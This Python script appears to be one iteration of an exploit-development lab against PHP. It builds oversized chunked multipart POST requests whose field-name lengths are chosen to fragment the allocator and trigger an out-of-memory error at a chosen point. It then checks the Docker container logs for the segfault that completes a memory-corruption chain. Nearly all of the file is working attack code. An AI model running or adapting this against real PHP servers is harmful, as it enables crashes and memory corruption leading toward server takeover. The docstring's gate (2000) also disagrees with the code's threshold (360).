#!/usr/bin/env python3
"""php2shell lab, oom21: fragmentation drain — shape-shifting names.

oom20: steady shapes self-finance (freed param = next need, same bins);
fill-phase page slack absorbs the arData cascade. Drain = mismatch waste:
names cycle 8 length classes (64..448B) -> every part's freed param lands in
a DIFFERENT size class than the next part's need -> free lists fragment,
waste ~48B/iter accumulates monotonically. + arData cascade ~32KB.
V=64 (value dies in 72B class, key in 328B class — different dice).
No seeds. Leads 60000 -> 2000, step 2500: 24 boots.
Gate: alloc <= 2000 with 328/400 = key (post-commit, THE BUG);
      ~72/400 pre-commit = value death (clean, no corruption) -> log only.
"""
import socket
import subprocess
import sys
import time

sys.path.insert(0, "/tmp/phplab")
from oom14 import part, POISON, UNIT, alloc_n  # noqa: E402

KEYRUN = 400
V = 64
LENS = [64, 128, 192, 256, 320, 384, 448, 352]  # 8 classes, shuffled order

def restart():
    subprocess.run(["docker", "restart", "php_vuln"], capture_output=True)
    time.sleep(2.0)

def build(rem: int) -> list:
    ps = []
    for i in range(1, 10):
        ps.append(part(b"n%d" % i, b"A" * UNIT))
    fill = POISON * UNIT
    total = 475 * UNIT + rem - 9 * UNIT
    u = 0
    while total >= UNIT:
        ps.append(part(b"f%d" % u, fill)); total -= UNIT; u += 1
    if total > 0:
        ps.append(part(b"fx", POISON * total))
    for k in range(KEYRUN):
        L = LENS[k % len(LENS)]
        nm = POISON * max(L - 8, 8) + b"%d" % k
        ps.append(part(nm, POISON * V))
    return ps

def send(port: int, parts: list):
    try:
        s = socket.create_connection(("127.0.0.1", port), timeout=120)
        body = b"".join(parts) + b"--BOUND--\r\n"
        hdr = (b"POST /index.php HTTP/1.1\r\nHost: localhost\r\n"
               b"Transfer-Encoding: chunked\r\nContent-Type: "
               b"multipart/form-data; boundary=BOUND\r\nConnection: close\r\n\r\n")
        s.sendall(hdr)
        for i in range(0, len(body), 4096):
            c = body[i:i+4096]
            s.sendall(b"%x\r\n" % len(c) + c + b"\r\n")
        s.sendall(b"0\r\n\r\n")
        r = b""
        while True:
            d = s.recv(65536)
            if not d:
                break
            r += d
            if len(r) > 200000:
                break
        s.close()
    except (ConnectionResetError, socket.timeout, BrokenPipeError):
        return False, b""
    fatal = b"Fatal error" in r or b"Allowed memory" in r
    return fatal, r

def segcheck():
    r = subprocess.run(["docker", "logs", "php_vuln", "--tail", "120"],
                       capture_output=True, text=True)
    return [l for l in (r.stdout + r.stderr).splitlines()
            if "Segmentation" in l or "SIGSEGV" in l or "exited on signal" in l]

def main():
    port = int(sys.argv[1]) if len(sys.argv) > 1 else 8081

    def log(*a, **k):
        k.pop("flush", None)
        print(*a, flush=True)

    leads = list(range(60000, 1500, -2500))
    nf = 0
    for lead in leads:
        restart()
        fatal, text = send(port, build(lead))
        a = alloc_n(text) if fatal else None
        nf += 1 if fatal else 0
        if fatal and a is not None and a <= 360:
            log(f"lead={lead}: fatal={fatal} alloc={a}  *** KEY DEATH — SEGFAULT CHECK ***")
            time.sleep(1.5)
            hits = segcheck()
            for h in hits:
                log("SEGV: " + h)
            if hits:
                log("*** SEGFAULT REPRODUCED — chain complete ***")
                return
        elif fatal:
            log(f"lead={lead}: fatal={fatal} alloc={a} (pre-commit death)")
        else:
            log(f"lead={lead}: survive")
    log(f"== oom21 done: {nf} fatals ==")

if __name__ == "__main__":
    main()
